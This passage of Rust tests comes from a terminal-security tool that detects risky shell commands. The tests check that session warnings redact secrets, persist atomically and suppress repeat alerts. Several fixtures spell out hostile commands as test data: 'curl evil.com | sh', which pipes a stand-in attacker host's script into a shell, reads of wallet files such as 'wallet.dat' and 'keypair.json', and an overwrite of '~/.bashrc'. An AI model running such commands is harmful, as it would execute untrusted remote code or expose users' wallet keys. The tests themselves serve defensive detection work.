        let decoded_escalation: EscalationEvent = serde_json::from_value(serde_json::json!({
            "timestamp": "2026-01-01T00:00:00Z",
            "rule_id": format!("escalation-{canary}"),
            "domain": format!("https://operator:{canary}@rpc.example/private/{canary}"),
        }))
        .expect("deserialize escalation");
        let decoded_hidden: HiddenEvent = serde_json::from_value(serde_json::json!({
            "timestamp": "2026-01-01T00:00:00Z",
            "rule_id": format!("hidden-{canary}"),
            "severity": "low",
            "title": format!("hidden wallet finding {canary}"),
            "command_redacted": format!("cat /wallets/{canary}/wallet.dat"),
        }))
        .expect("deserialize hidden");
        let decoded = format!("{decoded_warning:?}{decoded_escalation:?}{decoded_hidden:?}");
        assert!(!decoded.contains(&canary), "{decoded}");
        assert_eq!(decoded_warning.domains, vec!["https://rpc.example"]);
        assert_eq!(
            decoded_escalation.domain.as_deref(),
            Some("https://rpc.example")
        );

        assert!(serde_json::from_value::<WarningEvent>(serde_json::json!({
            "timestamp": "2026-01-01T00:00:00Z",
            "rule_id": "\u{1b}[31m",
            "severity": "high",
            "title": "control-only rule",
            "command_redacted": "true",
            "domains": [],
        }))
        .is_err());
        assert!(
            serde_json::from_value::<EscalationEvent>(serde_json::json!({
                "timestamp": "2026-01-01T00:00:00Z",
                "rule_id": "\u{1b}[31m",
            }))
            .is_err()
        );
        assert!(serde_json::from_value::<HiddenEvent>(serde_json::json!({
            "timestamp": "2026-01-01T00:00:00Z",
            "rule_id": "\u{1b}[31m",
            "severity": "low",
            "title": "control-only rule",
            "command_redacted": "true",
        }))
        .is_err());
    }

    #[test]
    fn session_public_traits_project_full_graph_and_preserve_categories() {
        use crate::event_buffer::{EventKind, TypedEvent, MANIFEST_FLAG_KEY};

        let canary = format!("ghp_canary_{}", "D".repeat(30));
        let mut session = SessionWarnings::new("privacy-direct-session");
        session.events.push_back(WarningEvent {
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            rule_id: format!("warning-{canary}"),
            severity: "high".to_string(),
            title: format!("wallet warning {canary}"),
            command_redacted: format!("cat /wallets/{canary}/keypair.json"),
            domains: vec![format!(
                "https://operator:{canary}@rpc.example/private/{canary}"
            )],
        });
        session.hidden_events.push_back(HiddenEvent {
            timestamp: "2026-01-01T00:00:00Z".to_string(),
            rule_id: "hidden".to_string(),
            severity: "low".to_string(),
            title: format!("hidden {canary}"),
            command_redacted: format!("echo {canary}"),
        });
        session.cooldowns.insert(
            format!("rule|{canary}"),
            format!("2026-01-01T00:00:00Z-{canary}"),
        );
        let mut typed = TypedEvent::new(
            "2026-01-01T00:00:00Z",
            EventKind::FileWrite,
            &format!("typed-{canary}"),
        )
        .with_meta("path", &format!("/wallets/{canary}/wallet.dat"))
        .with_meta(
            "host",
            &format!("https://operator:{canary}@rpc.example/private/{canary}"),
        )
        .with_meta(MANIFEST_FLAG_KEY, "true")
        .with_meta(&format!("private-{canary}"), &format!("value-{canary}"));
        typed.event_id = format!("event-{canary}");
        typed.sequence = 1;
        session.typed_events.push_back(typed);
        session.next_typed_event_sequence = 2;
        session
            .surfaced_correlations
            .push_back(format!("SecretWriteThenNetwork|e:{canary}:1"));

        let serialized = serde_json::to_string(&session).expect("serialize projected session");
        let debug = format!("{session:?}");
        assert!(!serialized.contains(&canary), "{serialized}");
        assert!(!debug.contains(&canary), "{debug}");

        let mut unsafe_identity = SessionWarnings::new("temporary-safe-id");
        unsafe_identity.session_id = canary.clone();
        let unsafe_identity_json =
            serde_json::to_string(&unsafe_identity).expect("serialize unsafe session id");
        let unsafe_identity_debug = format!("{unsafe_identity:?}");
        assert!(!unsafe_identity_json.contains(&canary));
        assert!(!unsafe_identity_debug.contains(&canary));
        assert!(unsafe_identity_json.contains(PRIVACY_REDACTED_SESSION_ID));
        assert!(unsafe_identity_debug.contains(PRIVACY_REDACTED_SESSION_ID));

        let decoded: SessionWarnings = serde_json::from_value(serde_json::json!({
            "session_id": canary,
            "session_start": "2026-01-01T00:00:00Z",
            "total_warnings": 1,
            "events": [{
                "timestamp": "2026-01-01T00:00:00Z",
                "rule_id": format!("warning-{canary}"),
                "severity": "high",
                "title": format!("wallet warning {canary}"),
                "command_redacted": format!("cat /wallets/{canary}/keypair.json"),
                "domains": [format!("https://operator:{canary}@rpc.example/private/{canary}")],
            }],
            "cooldowns": {(format!("rule|{canary}")): format!("2026-01-01T00:00:00Z-{canary}")},
            "typed_events": [{
                "event_id": format!("event-{canary}"),
                "sequence": 1,
                "timestamp": "2026-01-01T00:00:00Z",
                "kind": "file_write",
                "rule_id": format!("typed-{canary}"),
                "metadata": {
                    "path": format!("/wallets/{canary}/wallet.dat"),
                    "host": format!("https://operator:{canary}@rpc.example/private/{canary}"),
                    (MANIFEST_FLAG_KEY): "true",
                    (format!("private-{canary}")): format!("value-{canary}"),
                },
            }],
            "next_typed_event_sequence": 2,
            "surfaced_correlations": [format!("SecretWriteThenNetwork|e:{canary}:1")],
        }))
        .expect("deserialize projected session");
        let decoded_json = serde_json::to_string(&decoded).expect("reserialize session");
        let decoded_debug = format!("{decoded:?}");
        assert!(!decoded_json.contains(&canary), "{decoded_json}");
        assert!(!decoded_debug.contains(&canary), "{decoded_debug}");
        assert_eq!(decoded.session_id, PRIVACY_REDACTED_SESSION_ID);
        assert_eq!(decoded.typed_events[0].event_id, "legacy-event-1");
        assert_eq!(
            decoded.typed_events[0]
                .metadata
                .get(MANIFEST_FLAG_KEY)
                .map(String::as_str),
            Some("true")
        );
        assert!(decoded.surfaced_correlations.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn locked_writer_projects_fresh_mutation_before_persistence() {
        use crate::event_buffer::{EventKind, TypedEvent, MANIFEST_FLAG_KEY};

        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let temporary = tempfile::tempdir().expect("isolated session privacy state");
        let _state = TestStateHome::install(temporary.path());
        let _audit = TestEnvVar::set("TIRITH_LOG", "0");
        let canary = format!("ghp_canary_{}", "E".repeat(30));
        let session_id = "privacy-writer-session";

        with_session_locked(session_id, |session| {
            session.events.push_back(WarningEvent {
                timestamp: "2026-01-01T00:00:00Z".to_string(),
                rule_id: format!("warning-{canary}"),
                severity: "high".to_string(),
                title: format!("wallet warning {canary}"),
                command_redacted: format!("cat /wallets/{canary}/keypair.json"),
                domains: vec![format!(
                    "https://operator:{canary}@rpc.example/private/{canary}"
                )],
            });
            let mut typed = TypedEvent::new(
                "2026-01-01T00:00:00Z",
                EventKind::FileWrite,
                &format!("typed-{canary}"),
            )
            .with_meta("path", &format!("/wallets/{canary}/wallet.dat"))
            .with_meta(
                "host",
                &format!("https://operator:{canary}@rpc.example/private/{canary}"),
            )
            .with_meta(
                "rpc_url",
                &format!("https://operator:{canary}@rpc2.example/private/{canary}"),
            )
            .with_meta(MANIFEST_FLAG_KEY, "true")
            .with_meta(&format!("private-{canary}"), &format!("value-{canary}"));
            for index in 0..64 {
                typed.metadata.insert(
                    format!("extension-{index:02}-{canary}"),
                    format!("value-{index}-{canary}"),
                );
            }
            typed.event_id = format!("event-{canary}");
            typed.sequence = 1;
            session.typed_events.push_back(typed);
            session.next_typed_event_sequence = 2;
            session
                .surfaced_correlations
                .push_back(format!("SecretWriteThenNetwork|e:{canary}:1"));
            session.cooldowns.insert(
                format!("rule|{canary}"),
                format!("2026-01-01T00:00:00Z-{canary}"),
            );
        });

        let path = session_state_path(session_id).expect("session path");
        let body = std::fs::read_to_string(path).expect("persisted session");
        assert!(!body.contains(&canary), "{body}");
        let persisted: SessionWarnings = serde_json::from_str(&body).expect("projected session");
        assert_eq!(persisted.typed_events[0].event_id, "legacy-event-1");
        assert!(persisted.typed_events[0].metadata.len() <= 32);
        assert_eq!(
            persisted.typed_events[0]
                .metadata
                .get(MANIFEST_FLAG_KEY)
                .map(String::as_str),
            Some("true")
        );
        assert_eq!(
            persisted.typed_events[0]
                .metadata
                .get("host")
                .map(String::as_str),
            Some("https://rpc.example")
        );
        assert_eq!(
            persisted.typed_events[0]
                .metadata
                .get("rpc_url")
                .map(String::as_str),
            Some("https://rpc2.example")
        );
        assert!(persisted.surfaced_correlations.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn locked_writer_refuses_privacy_changed_session_identity() {
        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let temporary = tempfile::tempdir().expect("isolated session identity state");
        let _state = TestStateHome::install(temporary.path());
        let _audit = TestEnvVar::set("TIRITH_LOG", "0");
        let session_id = "privacy-writer-identity";
        let canary = format!("ghp_canary_{}", "F".repeat(30));

        let sessions = crate::policy::state_dir()
            .expect("isolated state root")
            .join("sessions");
        let raw_json = sessions.join(format!("{canary}.json"));
        let raw_lock = sessions.join(format!("{canary}.json.lock"));
        with_session_locked(&canary, |_| {
            panic!("privacy-unsafe identity must be refused before its mutation closure")
        });
        assert!(!raw_json.exists());
        assert!(!raw_lock.exists());
        assert!(!PRIVACY_UNSAFE_SESSION_DIAGNOSTIC.contains(&canary));

        // Even a pre-existing raw secret-named file is not read or mentioned in
        // a path-derived diagnostic.
        std::fs::create_dir_all(&sessions).expect("create raw fixture directory");
        std::fs::write(&raw_json, b"corrupt secret-named fixture")
            .expect("write raw secret-named fixture");
        let loaded = load(&canary);
        assert_eq!(loaded.session_id, PRIVACY_REDACTED_SESSION_ID);
        assert_eq!(
            std::fs::read(&raw_json).expect("raw fixture remains untouched"),
            b"corrupt secret-named fixture"
        );
        assert!(!raw_lock.exists());

        with_session_locked(session_id, |session| {
            session.session_id = canary.clone();
            session.cooldowns.insert(
                "must-not-persist".to_string(),
                "2026-01-01T00:00:00Z".to_string(),
            );
        });

        let path = session_state_path(session_id).expect("session path");
        assert!(
            !path.exists(),
            "a privacy-projected identity mismatch must not publish session JSON"
        );
    }

    #[cfg(unix)]
    #[test]
    fn strict_gc_honors_live_retention_and_preserves_invalid_anchor_pairs() {
        use std::io::{Seek as _, SeekFrom, Write as _};
        use std::os::unix::fs::PermissionsExt as _;
        use std::time::{Duration, SystemTime};

        let _lock = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(std::sync::PoisonError::into_inner);
        let temporary = tempfile::tempdir().expect("isolated GC state");
        let _state = TestStateHome::install(temporary.path());

        let prepare = |session_id: &str,
                       verdict: &crate::verdict::Verdict,
                       policy: &crate::policy::Policy| {
            crate::execution_state::prepare_execution(
                verdict,
                policy,
                "echo reviewed > ~/.bashrc",
                session_id,
                crate::escalation::CallerContext::Cli,
                crate::tokenize::ShellType::Posix,
                Duration::from_secs(30),
                Duration::from_secs(1),
            )
            .expect("prepare strict GC fixture")
        };
        let strict_path = |session_id: &str| {
            let json = session_state_path(session_id).expect("session path");
            json.parent()
                .expect("sessions directory")
                .join(format!("{session_id}.execution"))
        };
        let set_stale = |path: &std::path::Path| {
            let file = OpenOptions::new()
                .read(true)
                .write(true)
                .open(path)
                .expect("open stale GC fixture");
            let modified = SystemTime::now()
                .checked_sub(Duration::from_secs(2 * 3600))
                .expect("representable stale time");
            file.set_times(std::fs::FileTimes::new().set_modified(modified))
                .expect("backdate GC fixture");
        };

        let mut warning = crate::verdict::Verdict::from_findings(
            vec![make_finding(RuleId::DotfileOverwrite, Severity::Medium)],
            3,
            crate::verdict::Timings::default(),
        );
        warning.action = crate::verdict::Action::Warn;
        let retained_policy = crate::policy::Policy {
            escalation: vec![crate::escalation::EscalationRule::RepeatCount {
                rule_ids: vec![RuleId::DotfileOverwrite.to_string()],
                threshold: 99,
                window_minutes: 7 * 24 * 60,
                action: crate::escalation::EscalationAction::Block,
                domain_scoped: false,
                cooldown_minutes: 0,
            }],
            ..crate::policy::Policy::default()
        };
        let retained_id = "gc_live_retention";
        let retained = prepare(retained_id, &warning, &retained_policy);
        let retained_gate = crate::execution_state::ExecutionGate::acquire(
            retained.into_authorizable_draft().expect("warning draft"),
            Duration::from_secs(1),
        )
        .expect("retained warning gate");
        retained_gate
            .promote_kernel_exec_stop("gc-live-retention-proof")
            .expect("promote retained warning");
        let retained_strict = strict_path(retained_id);
        set_stale(&retained_strict);

        let empty_id = "gc_empty_expired";
        drop(prepare(
            empty_id,
            &crate::verdict::Verdict::allow_fast(3, crate::verdict::Timings::default()),
            &crate::policy::Policy::default(),
        ));
        let empty_strict = strict_path(empty_id);
        set_stale(&empty_strict);

        let missing_id = "gc_missing_strict";
        drop(prepare(
            missing_id,
            &crate::verdict::Verdict::allow_fast(3, crate::verdict::Timings::default()),
            &crate::policy::Policy::default(),
        ));
        let missing_strict = strict_path(missing_id);
        fs::remove_file(&missing_strict).expect("remove strict fixture");
        let missing_json = session_state_path(missing_id).expect("missing-pair JSON path");
        fs::write(
            &missing_json,
            serde_json::to_vec(&SessionWarnings::new(missing_id)).expect("legacy JSON"),
        )
        .expect("write missing-pair JSON");
        fs::set_permissions(&missing_json, fs::Permissions::from_mode(0o600))
            .expect("secure missing-pair JSON");
        set_stale(&missing_json);

        let corrupt_id = "gc_corrupt_strict";
        drop(prepare(
            corrupt_id,
            &crate::verdict::Verdict::allow_fast(3, crate::verdict::Timings::default()),
            &crate::policy::Policy::default(),
        ));
        let corrupt_strict = strict_path(corrupt_id);
        let mut corrupt = OpenOptions::new()
            .read(true)
            .write(true)
            .open(&corrupt_strict)
            .expect("open corrupt fixture");
        let second_slot = corrupt.metadata().expect("strict metadata").len() / 2;
        corrupt.write_all(&[0u8; 8]).expect("corrupt first slot");
        corrupt
            .seek(SeekFrom::Start(second_slot))
            .expect("seek second slot");
        corrupt.write_all(&[0u8; 8]).expect("corrupt second slot");
        corrupt.sync_all().expect("sync corrupt fixture");
        drop(corrupt);
        set_stale(&corrupt_strict);

        let partial_id = "gc_partial_strict";
        drop(prepare(
            partial_id,
            &crate::verdict::Verdict::allow_fast(3, crate::verdict::Timings::default()),
            &crate::policy::Policy::default(),
        ));
        let partial_strict = strict_path(partial_id);
        OpenOptions::new()
            .write(true)
            .open(&partial_strict)
            .expect("open partial fixture")
            .set_len(1)
            .expect("truncate partial fixture");
        set_stale(&partial_strict);

        let mismatch_id = "gc_anchor_mismatch";
        drop(prepare(
            mismatch_id,
            &crate::verdict::Verdict::allow_fast(3, crate::verdict::Timings::default()),
            &crate::policy::Policy::default(),
        ));
        let mismatch_strict = strict_path(mismatch_id);
        let mismatch_lock = session_lock_path(mismatch_id).expect("mismatch lock path");
        // Current strict state is anchored in the atomic
        // `<session>.execution.anchor` sidecar. The stable `.json.lock` may
        // still contain an obsolete pre-v2 marker, but it is deliberately not
        // authoritative once the strong sidecar exists. Corrupt the CURRENT
        // anchor boundary so this fixture actually exercises fail-closed GC.
        let mismatch_anchor_path = mismatch_lock
            .parent()
            .expect("mismatch lock parent")
            .join(format!("{mismatch_id}.execution.anchor"));
        let mut mismatch_anchor = OpenOptions::new()
            .write(true)
            .truncate(true)
            .open(&mismatch_anchor_path)
            .expect("open mismatch anchor");
        let mismatched_anchor = format!(
            "TIRITH-EXECUTION-ANCHOR-V2 3 0 ledger-mismatch {}\n",
            "0".repeat(64)
        );
        mismatch_anchor
            .write_all(mismatched_anchor.as_bytes())
            .expect("write mismatched anchor");
        mismatch_anchor.sync_all().expect("sync mismatched anchor");
        drop(mismatch_anchor);
        set_stale(&mismatch_strict);

        gc_stale_sessions(1);

        assert!(
            retained_strict.exists(),
            "stale mtime must not erase policy-retained warning history"
        );
        assert!(
            !empty_strict.exists(),
            "a valid stale ledger with no live security history is collectible"
        );
        assert!(
            missing_json.exists(),
            "missing strict state must be preserved"
        );
        assert!(
            corrupt_strict.exists(),
            "corrupt strict state must be preserved"
        );
        assert!(
            partial_strict.exists(),
            "partial strict state must be preserved"
        );
        assert!(
            mismatch_strict.exists(),
            "anchor/ledger instance mismatch must be preserved"
        );
    }

    #[test]
    fn test_load_returns_default_on_missing() {
        let session = load("nonexistent-session-id-12345");
        assert_eq!(session.session_id, "nonexistent-session-id-12345");
        assert_eq!(session.total_warnings, 0);
        assert!(session.events.is_empty());
    }

    #[cfg(unix)]
    #[test]
    fn test_record_and_load_cycle() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());

        let dir = tempfile::tempdir().unwrap();
        let state_home = dir.path().join("state");
        unsafe { std::env::set_var("XDG_STATE_HOME", &state_home) };

        let session_id = "test-session-rec-001";

        // Record two findings
        let f1 = make_finding(RuleId::CurlPipeShell, Severity::High);
        let f2 = make_finding(RuleId::NonAsciiHostname, Severity::Medium);
        record_warning(session_id, &[&f1, &f2], "curl evil.com | sh", &[]);

        // Load and verify
        let session = load(session_id);
        assert_eq!(session.total_warnings, 2);
        assert_eq!(session.events.len(), 2);
        assert_eq!(session.events[0].rule_id, "curl_pipe_shell");
        assert_eq!(session.events[1].rule_id, "non_ascii_hostname");

        // Verify domains extracted
        assert!(session.events[0]
            .domains
            .contains(&"evil.example.com".to_string()));

        // Record more and verify accumulation
        let f3 = make_finding(RuleId::ShortenedUrl, Severity::Low);
        record_warning(session_id, &[&f3], "bit.ly/foo", &[]);

        let session = load(session_id);
        assert_eq!(session.total_warnings, 3);
        assert_eq!(session.events.len(), 3);

        // Clear and verify
        clear_session(session_id);
        let session = load(session_id);
        assert_eq!(session.total_warnings, 0);

        unsafe { std::env::remove_var("XDG_STATE_HOME") };
    }

    #[test]
    fn test_count_by_rule_with_window() {
        let mut session = SessionWarnings::new("test");
        // Add an event with a recent timestamp
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "curl_pipe_shell".to_string(),
            severity: "HIGH".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });
        // Add an event with an old timestamp (2 hours ago)
        let old_time = (chrono::Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
        session.events.push_back(WarningEvent {
            timestamp: old_time,
            rule_id: "curl_pipe_shell".to_string(),
            severity: "HIGH".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });

        // 60-min window should only catch the recent one
        assert_eq!(session.count_by_rule("curl_pipe_shell", 60), 1);
        // 180-min window should catch both
        assert_eq!(session.count_by_rule("curl_pipe_shell", 180), 2);
        // Different rule should match zero
        assert_eq!(session.count_by_rule("non_ascii_hostname", 180), 0);
    }

    #[test]
    fn test_count_by_rule_and_domain() {
        let mut session = SessionWarnings::new("test");
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "non_ascii_hostname".to_string(),
            severity: "MEDIUM".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec!["evil.com".to_string()],
        });
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "non_ascii_hostname".to_string(),
            severity: "MEDIUM".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec!["good.com".to_string()],
        });

        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "evil.com", 60),
            1
        );
        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "good.com", 60),
            1
        );
        assert_eq!(
            session.count_by_rule_and_domain("non_ascii_hostname", "other.com", 60),
            0
        );
    }

    #[test]
    fn test_count_all() {
        let mut session = SessionWarnings::new("test");
        for _ in 0..5 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: "any_rule".to_string(),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
        }
        assert_eq!(session.count_all(60), 5);
    }

    #[test]
    fn test_top_rules() {
        let mut session = SessionWarnings::new("test");
        for _ in 0..3 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: "rule_a".to_string(),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
        }
        session.events.push_back(WarningEvent {
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: "rule_b".to_string(),
            severity: "LOW".to_string(),
            title: "test".to_string(),
            command_redacted: "cmd".to_string(),
            domains: vec![],
        });

        let top = session.top_rules();
        assert_eq!(top[0], ("rule_a".to_string(), 3));
        assert_eq!(top[1], ("rule_b".to_string(), 1));
    }

    #[test]
    fn test_event_cap() {
        let mut session = SessionWarnings::new("test");
        for i in 0..150 {
            session.events.push_back(WarningEvent {
                timestamp: chrono::Utc::now().to_rfc3339(),
                rule_id: format!("rule_{i}"),
                severity: "LOW".to_string(),
                title: "test".to_string(),
                command_redacted: "cmd".to_string(),
                domains: vec![],
            });
            session.total_warnings += 1;
        }
        // Manually apply cap as record_warning would
        while session.events.len() > MAX_EVENTS {
            session.events.pop_front();
        }
        assert_eq!(session.events.len(), MAX_EVENTS);
        assert_eq!(session.total_warnings, 150);
    }

    #[test]
    fn test_extract_domains_from_evidence() {
        let evidence = vec![
            Evidence::Url {
                raw: "https://evil.example.com/path".to_string(),
            },
            Evidence::HostComparison {
                raw_host: "GITHUB.COM".to_string(),
                similar_to: "g1thub.com".to_string(),
            },
            Evidence::Text {
                detail: "irrelevant".to_string(),
            },
        ];
        let domains = extract_domains_from_evidence(&evidence);
        assert!(domains.contains(&"evil.example.com".to_string()));
        assert!(domains.contains(&"github.com".to_string()));
        assert_eq!(domains.len(), 2);
    }

    #[test]
    fn suppress_check_is_session_backed() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }
        let sid = "test-suppress-1";
        // First sighting starts the cooldown and is NOT suppressed.
        assert!(!suppress_check(sid, "curl_pipe_shell", None, 3600));
        // A separate call (a fresh one-shot process behaves the same) reads the
        // persisted cooldown and reports suppressed.
        assert!(suppress_check(sid, "curl_pipe_shell", None, 3600));
        // A different rule is independent.
        assert!(!suppress_check(sid, "other_rule", None, 3600));
        // The cooldown is persisted on the session record.
        let sw = load(sid);
        assert!(sw.cooldowns.contains_key("curl_pipe_shell"));
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
    }

    #[test]
    fn suppress_check_clamps_overflowing_cooldown() {
        // A `cooldown_secs` above i64::MAX must NOT wrap negative (which would
        // place the expiry in the past and instantly expire the cooldown). After
        // clamping, the first sighting starts a far-future cooldown and the second
        // sighting (same key) is suppressed.
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }
        let sid = "test-suppress-overflow";
        // u64::MAX would overflow i64; the clamp keeps the expiry in the future.
        assert!(!suppress_check(sid, "curl_pipe_shell", None, u64::MAX));
        assert!(
            suppress_check(sid, "curl_pipe_shell", None, u64::MAX),
            "an overflowing cooldown must clamp (not wrap negative) and stay active"
        );
        // The persisted expiry parses as a real, future RFC3339 instant.
        let sw = load(sid);
        let expiry = sw
            .cooldowns
            .get("curl_pipe_shell")
            .expect("cooldown persisted");
        let parsed = chrono::DateTime::parse_from_rfc3339(expiry).expect("expiry is valid RFC3339");
        assert!(
            parsed > chrono::Utc::now(),
            "clamped expiry must be in the future, got {expiry}"
        );
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
    }

    /// W6 safety contract: a SUPPRESSED hit must emit a compact
    /// `finding_suppressed` audit rollup (the "never dropped silently"
    /// guarantee). Drives `suppress_check` with logging ENABLED and reads the
    /// audit log back to assert the rollup landed.
    #[cfg(unix)]
    #[test]
    fn suppress_check_emits_finding_suppressed_rollup() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        // Isolate BOTH state (session record) and data (audit log) into the temp
        // dir, and ENABLE logging so the rollup is actually written.
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path().join("state"));
            std::env::set_var("XDG_DATA_HOME", dir.path().join("data"));
            std::env::set_var("TIRITH_LOG", "1");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "test-suppress-rollup";
            // First sighting starts the cooldown, is NOT suppressed, emits nothing.
            assert!(!suppress_check(sid, "curl_pipe_shell", None, 3600));
            // Second sighting is suppressed -> must emit the rollup.
            assert!(suppress_check(sid, "curl_pipe_shell", None, 3600));

            let log = crate::audit::audit_log_path().expect("audit log path");
            let body = std::fs::read_to_string(&log).expect("audit log written");
            let rollup = body.lines().find(|l| l.contains("finding_suppressed"));
            let rollup = rollup.expect("a finding_suppressed rollup line must exist");
            let v: serde_json::Value =
                serde_json::from_str(rollup).expect("rollup line is valid JSON");
            assert_eq!(v["event"], "finding_suppressed");
            assert_eq!(v["hook_type"], "cooldown");
            assert_eq!(v["integration"], "suppression");
            assert!(
                v["detail"]
                    .as_str()
                    .map(|d| d.contains("rule_id=curl_pipe_shell"))
                    .unwrap_or(false),
                "rollup detail must carry the rule id: {v}"
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            std::env::remove_var("XDG_STATE_HOME");
            std::env::remove_var("XDG_DATA_HOME");
            std::env::remove_var("TIRITH_LOG");
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// H12 crash-atomic write: after a `with_session_locked` mutation the session
    /// file must be FULLY replaced (parses, carries the mutation) via temp+rename,
    /// leaving NO stray temp sibling in the sessions dir; and a SECOND mutation on
    /// the same session must still apply (the dedicated-lock-file + atomic-rename
    /// design keeps concurrent-safe semantics). The old in-place truncate could
    /// leave the file empty after a crash between `set_len(0)` and the write.
    #[cfg(unix)]
    #[test]
    fn with_session_locked_write_is_atomic_and_leaves_no_temp() {
        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "h12-atomic-session";
            // First mutation: starts a cooldown (writes `curl_pipe_shell` -> expiry).
            assert!(!suppress_check(sid, "curl_pipe_shell", None, 3600));

            let path = session_state_path(sid).expect("session path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();

            // The session file is fully written: it parses and carries the mutation.
            let body = std::fs::read_to_string(&path).expect("session file written");
            let parsed: SessionWarnings = serde_json::from_str(&body).expect("session file parses");
            assert!(
                parsed.cooldowns.contains_key("curl_pipe_shell"),
                "the mutation (cooldown) must be present in the persisted session"
            );

            // No leftover temp sibling from the temp+rename remains in the dir: a
            // `NamedTempFile` that was written but never `persist`ed (the crash/error
            // path) would survive as a `.tmpXXXXXX` file. (`.last_gc`, the session
            // JSON, and the `.json.lock` are legitimate persistent entries.)
            let temp_leaks: Vec<_> = std::fs::read_dir(&sessions_dir)
                .expect("read sessions dir")
                .filter_map(|e| e.ok())
                .map(|e| e.file_name().to_string_lossy().into_owned())
                .filter(|n| n.starts_with(".tmp"))
                .collect();
            assert!(
                temp_leaks.is_empty(),
                "no temp sibling must remain after the atomic rename: {temp_leaks:?}"
            );

            // A SECOND mutation in the same session still applies: a second distinct
            // rule starts its own cooldown, and the first cooldown is preserved.
            assert!(!suppress_check(sid, "dotfile_overwrite", None, 3600));
            let body2 = std::fs::read_to_string(&path).expect("session file rewritten");
            let parsed2: SessionWarnings =
                serde_json::from_str(&body2).expect("rewritten session parses");
            assert!(
                parsed2.cooldowns.contains_key("curl_pipe_shell")
                    && parsed2.cooldowns.contains_key("dotfile_overwrite"),
                "the second mutation must apply without dropping the first: {:?}",
                parsed2.cooldowns
            );
        });

        // SAFETY: serialized by TEST_ENV_LOCK; restore regardless of outcome.
        unsafe {
            match prev_state {
                Some(v) => std::env::set_var("XDG_STATE_HOME", v),
                None => std::env::remove_var("XDG_STATE_HOME"),
            }
            match prev_log {
                Some(v) => std::env::set_var("TIRITH_LOG", v),
                None => std::env::remove_var("TIRITH_LOG"),
            }
        }
        if let Err(e) = result {
            std::panic::resume_unwind(e);
        }
    }

    /// Security: a SYMLINK planted at the session LOCK path must be refused, so
    /// lock identity cannot be redirected to an attacker-chosen inode (which would
    /// break the serialization guarantee for concurrent writers). The guarded
    /// `with_session_locked` must skip the mutation entirely: it neither writes
    /// through the symlink nor persists the session data file.
    #[cfg(unix)]
    #[test]
    fn with_session_locked_refuses_symlinked_lock() {
        use crate::event_buffer::{EventKind, TypedEvent};

        let _guard = crate::TEST_ENV_LOCK
            .lock()
            .unwrap_or_else(|e| e.into_inner());
        let dir = tempfile::tempdir().unwrap();
        let prev_state = std::env::var("XDG_STATE_HOME").ok();
        let prev_log = std::env::var("TIRITH_LOG").ok();
        // SAFETY: serialized by TEST_ENV_LOCK across all modules.
        unsafe {
            std::env::set_var("XDG_STATE_HOME", dir.path());
            std::env::set_var("TIRITH_LOG", "0");
        }

        let result = std::panic::catch_unwind(|| {
            let sid = "symlinked-lock-session";
            let path = session_state_path(sid).expect("session path");
            let lock_path = session_lock_path(sid).expect("lock path");
            let sessions_dir = path.parent().expect("sessions dir").to_path_buf();
            std::fs::create_dir_all(&sessions_dir).expect("create sessions dir");

            // A sentinel OUTSIDE the sessions dir; the lock symlink targets it, so a
